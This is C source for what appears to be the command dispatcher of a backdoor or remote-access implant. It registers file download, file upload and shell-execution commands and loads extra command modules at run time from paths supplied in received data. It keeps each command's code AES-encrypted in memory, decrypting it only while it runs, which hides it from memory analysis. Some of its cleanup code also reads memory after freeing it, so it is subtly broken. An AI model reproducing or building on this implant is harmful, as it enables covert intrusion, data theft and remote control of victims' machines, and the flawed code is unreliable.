#include "commands.h"

typedef buffer (*command_type)(result *, buffer *);

typedef struct command_definition_s {
    command_type command_address;
    const unsigned char *command_start_address;
    const unsigned char *command_end_address;
    uint64_t command_id;
} command_definition;

typedef struct module_command_definition_s {
    command_definition command_definition;
    void *library_handle;

    void (*module_destructor)();

    struct module_command_definition_s *next_module_command;
} module_command_definition;

command_definition *commands = NULL;

module_command_definition *module_commands = NULL;

size_t commands_number = 0;

result initialize_commands() {
    INITIALIZE_RESULT(res);

    commands = (command_definition *) malloc_f(sizeof(command_definition) * 3);
    if (commands == NULL) {
        HANDLE_ERROR(res, FAILED_MALLOC, "Failed allocating commands", NULL)
    }

    extern unsigned char *__get_file_start;
    extern unsigned char *__get_file_end;
    commands[0] = (command_definition) {
            .command_address = get_file,
            .command_start_address = (const unsigned char *) &__get_file_start,
            .command_end_address = (const unsigned char *) &__get_file_end,
            .command_id = GET_FILE_COMMAND_ID
    };

    extern unsigned char *__put_file_start;
    extern unsigned char *__put_file_end;
    commands[1] = (command_definition) {
            .command_address = put_file,
            .command_start_address = (const unsigned char *) &__put_file_start,
            .command_end_address = (const unsigned char *) &__put_file_end,
            .command_id = PUT_FILE_COMMAND_ID
    };

    extern unsigned char *__run_shell_start;
    extern unsigned char *__run_shell_end;
    commands[2] = (command_definition) {
            .command_address = run_shell,
            .command_start_address = (const unsigned char *) &__run_shell_start,
            .command_end_address = (const unsigned char *) &__run_shell_end,
            .command_id = RUN_SHELL_COMMAND_ID
    };

    commands_number = 3;

    WRITE_LOG(DEBUG, "Initialized commands", NULL)

    error_cleanup:

    return res;
}

void add_module_command(result *res, const char *module_path, const char *function_name, uint64_t function_size,
                        uint64_t command_id) {
    result (*module_constructor)() = NULL;
    void (*module_destructor)() = NULL;

    WRITE_LOG(DEBUG, "Adding module command: %s:%s, id: 0x%08llx", module_path, function_name, command_id)

    void *handle = dlopen(module_path, RTLD_LAZY);
    if (handle == NULL) {
        HANDLE_ERROR((*res), FAILED_DLOPEN, "Failed opening shared object", NULL)
    }
    buffer (*chosen_command)(result *, buffer *) = NULL;

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    int *(*eee)(void) = NULL;
    eee = dlsym(handle, "__errno_location");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    module_constructor = dlsym(handle, string_module_constructor);
    module_destructor = dlsym(handle, string_module_destructor);

    *res = module_constructor();
    HANDLE_ERROR_RESULT((*res))

    chosen_command = dlsym(handle, function_name);
    if (chosen_command == NULL) {
        HANDLE_ERROR((*res), FAILED_DLSYM, "Failed loading symbol %s", function_name)
    }

    module_command_definition *new_module = malloc_f(sizeof(module_command_definition));
    if (new_module == NULL) {
        HANDLE_ERROR((*res), FAILED_MALLOC, "Failed allocating new module", NULL)
    }

    *new_module = (module_command_definition) {
            .command_definition=(command_definition) {
                    .command_address=chosen_command,
                    .command_start_address=(const unsigned char *) chosen_command,
                    .command_end_address=(const unsigned char *) chosen_command + function_size,
                    .command_id=command_id
            },
            .library_handle=handle,
            .module_destructor=module_destructor,
            .next_module_command=module_commands};

    module_commands = new_module;

    WRITE_LOG(DEBUG, "Added module command: %s:%s, id: 0x%08llx", module_path, function_name, command_id)

    goto cleanup;

    error_cleanup:

    if (module_destructor != NULL) {
        module_destructor();
    }
    if (handle != NULL) {
        dlclose(handle);
    }

    cleanup:

    return;
}

void add_module_command_from_buffer(result *res, buffer *buf) {
    unsigned int module_path_length = read_unsigned_int(res, buf);
    HANDLE_ERROR_RESULT((*res))
    const char *module_path = read_string(res, buf, module_path_length);
    HANDLE_ERROR_RESULT((*res))
    unsigned int function_name_length = read_unsigned_int(res, buf);
    HANDLE_ERROR_RESULT((*res))
    const char *function_name = read_string(res, buf, function_name_length);
    HANDLE_ERROR_RESULT((*res))
    uint64_t function_size = read_uint64_t(res, buf);
    HANDLE_ERROR_RESULT((*res))
    uint64_t command_id = read_uint64_t(res, buf);
    HANDLE_ERROR_RESULT((*res))

    add_module_command(res, module_path, function_name, function_size, command_id);
    HANDLE_ERROR_RESULT((*res))

    error_cleanup:

    return;
}

size_t round_up(size_t num, size_t multiple) {
    return ((num / multiple) + (num % multiple ? 1 : 0)) * multiple;
}

size_t round_down(size_t num, size_t multiple) {
    return (num / multiple) * multiple;
}

result xcrypt_command(const char *key, const char *iv, const unsigned char *start_address,
                      const unsigned char *end_address) {
    INITIALIZE_RESULT(res);
    struct AES_ctx command_ctx;
    AES_init_ctx_iv(&command_ctx, (const uint8_t *) key, (const uint8_t *) iv);

    size_t pagesize = sysconf_f(_SC_PAGE_SIZE);
    if (pagesize == -1) {
        HANDLE_ERROR(res, FAILED_SYSCONF, "Failed getting page size", NULL)
    }

    void *start_address_p = (void *) round_down((size_t) start_address, pagesize);
    size_t section_size = round_up((size_t) end_address, pagesize) - round_down((size_t) start_address, pagesize);
    if (mprotect_f(start_address_p, section_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        HANDLE_ERROR(res, FAILED_MPROTECT, "Failed changing code protection", NULL)
    }

    AES_CTR_xcrypt_buffer(&command_ctx, (uint8_t *) start_address, end_address - start_address);

    if (mprotect_f(start_address_p, section_size, PROT_READ | PROT_EXEC) == -1) {
        HANDLE_ERROR(res, FAILED_MPROTECT, "Failed changing code protection", NULL)
    }

    goto cleanup;

    error_cleanup:

    cleanup:

    return res;
}

buffer run_command(result *res, uint64_t command_id, const char *key, const char *iv, buffer *buf) {
    WRITE_LOG(INFO, "Running command: 0x%08llx", command_id)

    INITIALIZE_BUFFER(buf_out);
    INITIALIZE_RESULT(tmp_res);

    command_definition *chosen_command = NULL;

    for (size_t command_index = 0; command_index < commands_number; command_index++) {
        if (command_id == commands[command_index].command_id) {
            chosen_command = &commands[command_index];
            break;
        }
    }

    if (chosen_command == NULL) {
        module_command_definition *chosen_module_command;
        for (chosen_module_command = module_commands;
             chosen_module_command != NULL; chosen_module_command = chosen_module_command->next_module_command) {
            if (command_id == chosen_module_command->command_definition.command_id) {
                chosen_command = &chosen_module_command->command_definition;
                break;
            }
        }
    }

    if (chosen_command == NULL) {
        HANDLE_ERROR((*res), UNKNOWN_COMMAND, "Unknown command: 0x%08llx", command_id)
    }

    *res = xcrypt_command(key, iv, chosen_command->command_start_address, chosen_command->command_end_address);
    HANDLE_ERROR_RESULT((*res))

    buf_out = chosen_command->command_address(res, buf);
    HANDLE_ERROR_RESULT((*res))

    WRITE_LOG(INFO, "Finished running command: 0x%08llx", command_id)

    goto cleanup;

    error_cleanup:

    destroy_buffer(&buf_out);

    cleanup:

    if (chosen_command != NULL) {
        tmp_res = xcrypt_command(key, iv, chosen_command->command_start_address, chosen_command->command_end_address);
        if (RESULT_SUCCEEDED((*res))) {
            *res = tmp_res;
        }
    }

    return buf_out;
}

void remove_module_command(result *res, uint64_t command_id) {
    module_command_definition **chosen_module_command;
    for (chosen_module_command = &module_commands;
         *chosen_module_command != NULL; chosen_module_command = &(*chosen_module_command)->next_module_command) {
        if (command_id == (*chosen_module_command)->command_definition.command_id) {
            break;
        }
    }

    if (*chosen_module_command == NULL) {
        HANDLE_ERROR((*res), UNKNOWN_COMMAND, "Unknown module command: 0x%08llx", command_id)
    }

    (*chosen_module_command)->module_destructor();
    dlclose((*chosen_module_command)->library_handle);
    free_f(*chosen_module_command);

    *chosen_module_command = (*chosen_module_command)->next_module_command;

    WRITE_LOG(DEBUG, "Removed module command: 0x%08llx", command_id)

    error_cleanup:

    return;
}

void remove_module_command_from_buffer(result *res, buffer *buf) {
    uint64_t command_id = read_uint64_t(res, buf);
    HANDLE_ERROR_RESULT((*res))

    remove_module_command(res, command_id);
    HANDLE_ERROR_RESULT((*res))

    error_cleanup:

    return;
}

void destroy_module_commands() {
    module_command_definition **position = &module_commands;
    while (*position != NULL) {
        module_command_definition **tmp = &(*position)->next_module_command;
        (*position)->module_destructor();
        free_f(*position);
        position = tmp;
    }
    module_commands = NULL;

    WRITE_LOG(DEBUG, "Destroyed modules", NULL)
}

void destroy_commands() {
    free_f(commands);
    commands = NULL;
    commands_number = 0;

    WRITE_LOG(DEBUG, "Destroyed commands", NULL)
}
